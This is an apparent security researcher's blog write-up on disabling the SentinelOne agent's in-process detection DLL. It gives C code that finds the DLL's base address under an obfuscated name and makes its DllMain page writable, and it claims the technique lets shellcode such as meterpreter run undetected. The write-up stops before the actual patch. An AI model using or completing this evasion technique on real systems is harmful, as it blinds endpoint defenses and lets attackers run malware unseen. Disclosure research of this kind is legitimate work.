---
layout: default
---
<br/>
# SentinelOne Agent Bypass
<hr/>

## What is this?
This is a write-up describing the discovery and exploitation of a vulnerability in Sentinel Agent ("S1"), the in-process monitoring component of the SentinelOne platform.

<hr/>

## What is SentinelOne?
SentinelOne is a cybersecurity platform known for its robust Endpoint Detection and Response (EDR) capabilities. It utilizes AI and machine learning to deliver real-time threat detection, automated response, and full visibility into endpoint activities.

SentinelOne is widely adopted across various industries due to its effectiveness in handling sophisticated attacks, ease of deployment, and comprehensive threat intelligence capabilities. Its ability to autonomously detect and respond to threats without manual intervention sets it apart as a leader in the EDR space.

*(ChatGPT)*

<hr/>

## What is the vulnerability?
Successful exploitation of the vulnerability blinds the in-process detection, meaning you can run even the most toxic shellcode (e.g., meterpreter) without it getting detected. You can also remotely blind processes and inject into them, also without detection.

<hr/>

## What is "in-process detection"?
When the system boots, S1's kernel driver (`SentinelMonitor.sys`) is loaded. This driver calls the `PsSetCreateProcessNotifyRoutine()` Windows API to tell Windows that it wants to be notified every time a new process is created.

Now, whenever a new process is created, the driver is notified, and it has the opportunity to perform some tasks as part of the process creation. One of these tasks is injecting a DLL into the newly created process. This DLL is named `InProcessClient64.dll` on x64 systems and its purpose is to monitor the process for threats. It performs numerous timer- or event-driven tasks such as scanning memory for threats and watching for suspicious memory operations and network connections.

If we use WinDbg to debug notepad.exe, we can see this DLL loaded alongside all the other modules in the process:
```
0:000> lm
start             end                 module name
00007ff6`2e580000 00007ff6`2e5da000   notepad    (deferred)             
00007ffd`f8c10000 00007ffd`f8ea2000   COMCTL32   (deferred)             
00007ffe`14a80000 00007ffe`14e96000   InProcessClient64   (deferred)
00007ffe`151e0000 00007ffe`15208000   bcrypt     (deferred)             
00007ffe`15380000 00007ffe`15491000   ucrtbase   (deferred)             
00007ffe`154a0000 00007ffe`1585a000   KERNELBASE   (deferred)             
...snip...
```

We can get some information about the DLL:
```
0:000> lmDvm InProcessClient64
start             end                 module name
00007ffe`14a80000 00007ffe`14e96000   InProcessClient64   (deferred)             
    Image path: C:\Program Files\SentinelOne\Sentinel Agent 24.1.4.257\InProcessClient64.dll
    Image name: InProcessClient64.dll
    Timestamp:        Thu Sep 26 15:37:12 2024 (66F5B7E8)
    CheckSum:         0040B65F
    ImageSize:        00416000
    File version:     24.1.4.257
    Product version:  24.1.4.257
    File type:        2.0 Dll
    Information from resource tables:
        CompanyName:      SentinelOne, Inc.
        ProductName:      Sentinel Agent
        InternalName:     WinHostDll
        OriginalFilename: WinHostDll.dll
        ProductVersion:   24.1.4.257
        FileVersion:      24.1.4.257
        FileDescription:  WinAgentHostDll
        LegalCopyright:   SentinelOne, Inc.
```

<hr/>

## But what exactly is InProcessClient64.dll doing?
I don't really know. A lot. Fortunately, developing this exploit did not require a deep understanding of how the DLL works or how it fits into the complex S1 platform, just that certain functions in the DLL are called at certain times. This was enough to give me an idea on how to approach exploiting it.

<hr/>

## What was the idea?
The idea was that if I could write to the DLL's memory, maybe I could influence its behavior (i.e. disable it).

To be able to write to memory, the first task was to locate the base address of `InProcessClient64.dll`. Due to ASLR, this address will be different on every system, and after every reboot. I created a C++ console app in Visual Studio whose sole purpose (for now) was to attack the `InProcessClient64.dll` that gets injected into it when the process is created.

Using a combination of Windows APIs including `OpenProcess()`, `EnumProcessModules()`, `GetModuleInformation()`, and `GetModuleFileNameExA()`, it is possible to loop through the loaded modules in your process to look for one in particular.

Here is the code that loops through the loaded modules and looks for the one we're interested in. Note that I am not using the DLL's full name, which is probably not necessary, but is less likely to be seen as malicious if S1 happens to be watching for something like this.

```c
    HMODULE hModules[1024];
    DWORD cbNeeded = 0;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());

    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
    {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
        {
            MODULEINFO modInfo = { 0 };
            if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
            {
                CHAR modName[MAX_PATH] = { 0 };
                if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
                {
                    if (std::string(modName).find("cessClient6") != std::string::npos)
                    {
                        // we have found the InProcessClient64.dll module, so now we can grab its base address

                        QWORD base = (QWORD)modInfo.lpBaseOfDll;
                    }
                }
            }
        }
    }
```

Now that I had the base address of the DLL, I could try actually writing to its memory. But where? As the write target, I chose `DllMain()`, the default entrypoint for DLLs. To find the location of this function, I used IDA Pro, which showed its offset as `0x32b0`, which means its virtual address is `0x32b0` plus the base address I just obtained. (For some reason IDA Pro is calling this function `DllEntryPoint()`. I don't know what that's about.)

![DllMain](/images/dllmain.png)

But first things first - before I could write memory, I needed to set the memory protection of this address to actually allow writing, since this region is marked as `PAGE_EXECUTE_READ` as can be seen in Windbg:

```
0:000> !address inprocessclient64+32b0
...snip...
Usage:                  Image
Base Address:           00007ffb`87571000
End Address:            00007ffb`877b4000
Region Size:            00000000`00243000 (   2.262 MB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
...snip...
```

To modify memory protection, I used the `VirtualProtect()` Windows API. This function accepts the address whose protection you want to change, how many bytes, the new protection constant, and a place to store the old protection constant which is useful if you want to set it back to its original value when you're done, which I did.

So I modified the PoC to include the following code:

```c
    QWORD base = (QWORD)modInfo.lpBaseOfDll;
    QWORD entrypoint = base + 0x32b0;
    DWORD oldProtect = 0;

    printf("Write target: 0x%llx\n", (QWORD)entrypoint);

    if (VirtualProtect((LPVOID)entrypoint, 1, PAGE_READWRITE, &oldProtect))
    {
        printf("Success!\n");
        VirtualProtect((LPVOID)entrypoint, 1, oldProtect, &oldProtect)
    }
```

When I ran the updated PoC in WinDbg, I was able to verify that the protection for the target address had been changed to `PAGE_READWRITE`:

![VirtualProtect](/images/vprotect.png)

<hr/>

## So what now?
More stuff.
